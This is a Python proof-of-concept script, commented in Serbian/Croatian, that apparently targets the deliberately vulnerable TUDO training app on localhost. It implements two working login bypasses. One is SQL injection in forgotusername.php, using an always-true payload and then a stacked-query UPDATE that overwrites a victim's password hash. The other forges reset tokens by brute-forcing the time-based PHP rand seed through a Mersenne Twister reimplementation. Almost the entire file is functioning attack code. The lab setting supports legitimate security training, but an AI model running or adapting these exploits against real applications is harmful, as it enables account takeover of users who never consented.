#!/usr/bin/env python3
"""
TUDO (bmdyy/tudo) - Login Bypass Exploit
==========================================
Zadatak: Security Code Review and Analysis
Target:  http://localhost:8000

Postoje dva nacina za authentication bypass:

  Metoda 1 - SQL Injection (forgotusername.php)
  ---------------------------------------------
  Fajl forgotusername.php koristi pg_query() sa direktnom string
  konkatenacijom umesto prepared statement-a:

      $ret = pg_query($db, "select * from users where username='".$username."';");

  Inject-ujemo uvek-tacan uslov da aplikacija vrati "User exists!" i
  time potvrdimo da mozemo manipulisati WHERE klauzulom.

  Zatim koristimo isti SQLi da promenimo sifru user1 direktno u bazi
  putem stacked queries (PostgreSQL podrzava ; za vise upita u jednom
  pg_query pozivu), pa se prijavljujemo normalnom login formom.

  Metoda 2 - Predictable Password Reset Token (forgotpassword.php)
  ----------------------------------------------------------------
  Token se generise u includes/utils.php:

      srand(round(microtime(true) * 1000));
      for ($i = 0; $i < 32; $i++) {
          $ret .= $chars[rand(0, strlen($chars)-1)];
      }

  srand() se seed-uje trenutnim vremenom u milisekundama. To znaci
  da je seed predvidiv: napadac belezi vreme pre i posle zahteva,
  pa brute-force-uje ~4000 mogucih seed-ova dok ne reprodukuje isti
  token koji je server generisao. Token se zatim koristi na
  resetpassword.php za promenu sifre.

Upotreba:
    python3 login_bypass.py --method sqli
    python3 login_bypass.py --method token
    python3 login_bypass.py --method all
    python3 login_bypass.py --target http://localhost:8000 --method all
"""

import argparse
import hashlib
import math
import sys
import time

# ---------------------------------------------------------------------------
# PHP MT19937 implementation
# PHP 7.1+ made rand() an alias for mt_rand() (Mersenne Twister).
# The old LCG (state * 1103515245 + 12345) only matched the C stdlib rand(),
# which PHP stopped using. MT19937 with single 32-bit output per call is
# the correct algorithm for PHP 7.1+ rand(min, max) -> mt_output % (max+1).
# ---------------------------------------------------------------------------
_MT_N = 624
_MT_M = 397
_MT_MATRIX_A  = 0x9908b0df
_MT_UPPER_MASK = 0x80000000
_MT_LOWER_MASK = 0x7fffffff


def _mt_init(seed):
    mt = [0] * _MT_N
    mt[0] = seed & 0xffffffff
    for i in range(1, _MT_N):
        mt[i] = (1812433253 * (mt[i - 1] ^ (mt[i - 1] >> 30)) + i) & 0xffffffff
    return mt


def _mt_twist(mt):
    mag01 = [0, _MT_MATRIX_A]
    for kk in range(_MT_N - _MT_M):
        y = (mt[kk] & _MT_UPPER_MASK) | (mt[kk + 1] & _MT_LOWER_MASK)
        mt[kk] = mt[kk + _MT_M] ^ (y >> 1) ^ mag01[y & 1]
    for kk in range(_MT_N - _MT_M, _MT_N - 1):
        y = (mt[kk] & _MT_UPPER_MASK) | (mt[kk + 1] & _MT_LOWER_MASK)
        mt[kk] = mt[kk + (_MT_M - _MT_N)] ^ (y >> 1) ^ mag01[y & 1]
    y = (mt[_MT_N - 1] & _MT_UPPER_MASK) | (mt[0] & _MT_LOWER_MASK)
    mt[_MT_N - 1] = mt[_MT_M - 1] ^ (y >> 1) ^ mag01[y & 1]


def _mt_temper(y):
    y ^= y >> 11
    y ^= (y << 7) & 0x9d2c5680
    y ^= (y << 15) & 0xefc60000
    y ^= y >> 18
    return y & 0xffffffff

try:
    import requests
except ImportError:
    print("[!] Instaliraj requests: pip install requests")
    sys.exit(1)

TARGET   = "http://localhost:8000"
CHARSET  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
# Koristimo user1 jer forgotpassword.php eksplicitno blokira 'admin':
#     if ($username != 'admin') { ... generisi token ... }
VICTIM   = "user1"


# -----------------------------------------------------------------------
# Pomocne funkcije
# -----------------------------------------------------------------------

def sha256(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def php_srand_rand(seed: int, n_calls: int, max_val: int) -> list:
    """
    Replicira PHP rand(0, max_val) nakon srand(seed).
    PHP 7.1+ koristi Mersenne Twister (rand() je alias za mt_rand()).
    Svaki poziv rand() trosi jedan 32-bitni MT output:
        rezultat = mt_temper(mt_state[mti]) % (max_val + 1)
    """
    mt = _mt_init(seed)
    mti = _MT_N  # first call triggers twist
    results = []
    for _ in range(n_calls):
        if mti >= _MT_N:
            _mt_twist(mt)
            mti = 0
        y = mt[mti]
        mti += 1
        results.append(_mt_temper(y) % (max_val + 1))
    return results


def predict_token(seed_ms: int) -> str:
    """Generisi token koji bi PHP generisao sa datim seed-om."""
    charset_len = len(CHARSET) - 1  # rand(0, strlen($chars)-1)
    indices = php_srand_rand(seed_ms, 32, charset_len)
    return ''.join(CHARSET[i] for i in indices)


def session_after_login(base: str, username: str, password: str):
    """Prijavi se na login.php i vrati session objekat ako uspe."""
    s = requests.Session()
    r = s.post(f"{base}/login.php", data={
        "username": username,
        "password": password
    }, allow_redirects=False)
    if r.status_code == 302 and "index.php" in r.headers.get("Location", ""):
        r2 = s.get(f"{base}/index.php")
        if username in r2.text:
            return s
    return None


# -----------------------------------------------------------------------
# Metoda 1: SQL Injection u forgotusername.php
# -----------------------------------------------------------------------

def method_sqli(base: str) -> bool:
    """
    Ranjivi kod (forgotusername.php, linija 12):

        $ret = pg_query($db, "select * from users where username='".$username."';");

    Korak 1: Proveri SQLi inject-om koji uvek vraca tacno.
    Korak 2: Iskoristi stacked query da promijenimo sifru user1.
    Korak 3: Prijavi se s novom sifrom.
    """
    print("\n[METODA 1] SQL Injection - forgotusername.php")
    print("-" * 50)

    # --- Korak 1: Verifikacija ranjivosti ---
    # Payload:  ' OR '1'='1
    # Rezultat: select * from users where username='' OR '1'='1';
    # Vraca sve redove -> "User exists!"
    print("[*] Korak 1: Verifikacija SQLi ranjivosti...")

    # LIMIT 1 jer forgotusername.php proverava pg_num_rows() === 1 (tacno jedan red).
    # Bez LIMIT-a ' OR '1'='1 vraca SVE korisnike (> 1 red) -> uslov nije zadovoljen.
    payload_verify = "' OR '1'='1' LIMIT 1 --"
    r = requests.post(f"{base}/forgotusername.php",
                      data={"username": payload_verify})

    if "User exists!" in r.text:
        print("    [+] Ranjivost potvrdjana - server vratio 'User exists!'")
        print(f"    Payload: {payload_verify}")
        print(f"    SQL:     select * from users where username='' OR '1'='1' LIMIT 1 --';")
    else:
        print("    [-] Inject nije radio - proveri da li je app pokrenuta")
        return False

    # --- Korak 2: Promena sifre putem stacked query ---
    # PostgreSQL podrzava vise upita u jednom pg_query() pozivu.
    # Inject: '; UPDATE users SET password='<hash>' WHERE username='user1'; --
    # login.php heshuje sifru sa sha256, pa moramo upisati hash.
    new_pass      = "pwned123"
    new_pass_hash = sha256(new_pass)

    print(f"\n[*] Korak 2: Menjamo sifru korisnika '{VICTIM}' putem stacked query...")
    print(f"    Nova sifra:   {new_pass}")
    print(f"    SHA256 hash:  {new_pass_hash}")

    payload_update = (
        f"'; UPDATE users SET password='{new_pass_hash}' "
        f"WHERE username='{VICTIM}'; --"
    )
    r = requests.post(f"{base}/forgotusername.php",
                      data={"username": payload_update})

    # Server vraca "User doesn't exist." jer prvi SELECT nema rezultata.
    # To je ocekivano - bitno je da se UPDATE izvrsio.
    print(f"    Rezultat: server vratio 'User doesn't exist.' (ocekivano)")

    # --- Korak 3: Prijava s novom sifrom ---
    print(f"\n[*] Korak 3: Prijava kao '{VICTIM}' s novom sifrom...")
    s = session_after_login(base, VICTIM, new_pass)

    if s:
        print(f"    [+] USPEH - prijavljeni kao '{VICTIM}'!")
        return True
    else:
        print("    [-] Prijava nije uspela. Moguce da UPDATE nije prosao.")
        return False


# -----------------------------------------------------------------------
# Metoda 2: Predictable Reset Token
# -----------------------------------------------------------------------

def method_token(base: str) -> bool:
    """
    Ranjivi kod (includes/utils.php, linije 3-9):

        srand(round(microtime(true) * 1000));
        for ($i = 0; $i < 32; $i++) {
            $ret .= $chars[rand(0,strlen($chars)-1)];
        }

    PHP srand() seed je trenutno vreme u milisekundama.
    Belezimo ts pre i posle zahteva, brute-force-ujemo sve
    seed-ove u tom prozoru dok ne reproduciramo isti token.

    NAPOMENA: forgotpassword.php eksplicitno blokira 'admin':
        if ($username != 'admin') { ... }
    Zbog toga resetujemo user1.
    """
    print("\n[METODA 2] Predictable Reset Token - forgotpassword.php")
    print("-" * 50)

    # --- Korak 1: Zatrazi reset token ---
    print(f"[*] Korak 1: Trazimo reset token za '{VICTIM}'...")

    ts_before = math.floor(time.time() * 1000)
    r = requests.post(f"{base}/forgotpassword.php",
                      data={"username": VICTIM})
    ts_after = math.floor(time.time() * 1000)

    if "Email sent!" not in r.text:
        print("    [-] Server nije potvrdio generisanje tokena.")
        return False

    print(f"    [+] Server generisao token ('Email sent!')")
    print(f"    Vremenski prozor: {ts_before} - {ts_after} ms")
    print(f"    Kandidata za proveru: {ts_after - ts_before + 1001} (sa marginom)")

    # --- Korak 2: Brute-force seed-ova ---
    print(f"\n[*] Korak 2: Brute-force seed-ova...")

    found_token = None
    attempts = 0

    # Margina +-500ms za mrezno kasnjenje
    for seed in range(ts_before - 500, ts_after + 500):
        candidate = predict_token(seed)
        attempts += 1

        r = requests.get(f"{base}/resetpassword.php",
                         params={"token": candidate},
                         allow_redirects=False)

        # Validan token -> server vraca formu za reset (nema "Token is invalid.")
        if r.status_code == 200 and "Token is invalid." not in r.text:
            found_token = candidate
            print(f"    [+] Token nadjen nakon {attempts} pokusaja!")
            print(f"    Token: {found_token}")
            print(f"    Seed:  {seed}")
            break

    if not found_token:
        print(f"    [-] Token nije nadjen u {attempts} pokusaja.")
        print("    Pokusaj ponovo - moguce vece mrezno kasnjenje.")
        return False

    # --- Korak 3: Reset sifre ---
    new_pass = "pwned456"
    print(f"\n[*] Korak 3: Reset sifre korisnika '{VICTIM}'...")
    print(f"    Nova sifra: {new_pass}")

    r = requests.post(f"{base}/resetpassword.php", data={
        "token":     found_token,
        "password1": new_pass,
        "password2": new_pass
    })

    if "Password changed!" not in r.text:
        print("    [-] Reset nije uspeo.")
        return False

    print("    [+] Sifra uspesno promenjena!")

    # --- Korak 4: Prijava ---
    print(f"\n[*] Korak 4: Prijava kao '{VICTIM}'...")
    s = session_after_login(base, VICTIM, new_pass)

    if s:
        print(f"    [+] USPEH - prijavljeni kao '{VICTIM}'!")
        return True
    else:
        print("    [-] Prijava nije uspela.")
        return False


# -----------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="TUDO Login Bypass PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Primeri:
  python3 login_bypass.py --method sqli
  python3 login_bypass.py --method token
  python3 login_bypass.py --method all
  python3 login_bypass.py --target http://localhost:8000 --method all
        """
    )
    parser.add_argument("--target", default=TARGET,
                        help=f"Base URL aplikacije (default: {TARGET})")
    parser.add_argument("--method", choices=["sqli", "token", "all"],
                        default="all", help="Metoda napada (default: all)")
    args = parser.parse_args()

    print("=" * 55)
    print("  TUDO - Login Bypass PoC")
    print("  github.com/bmdyy/tudo")
    print("=" * 55)
    print(f"\n[*] Target: {args.target}")
    print(f"[*] Metoda: {args.method}")

    results = {}

    if args.method in ("sqli", "all"):
        results["sqli"] = method_sqli(args.target)

    if args.method in ("token", "all"):
        results["token"] = method_token(args.target)

    print("\n" + "=" * 55)
    print("  REZULTATI")
    print("=" * 55)
    for name, ok in results.items():
        status = "[+] USPEH" if ok else "[-] NEUSPEH"
        print(f"  {name:10} {status}")


if __name__ == "__main__":
    main()
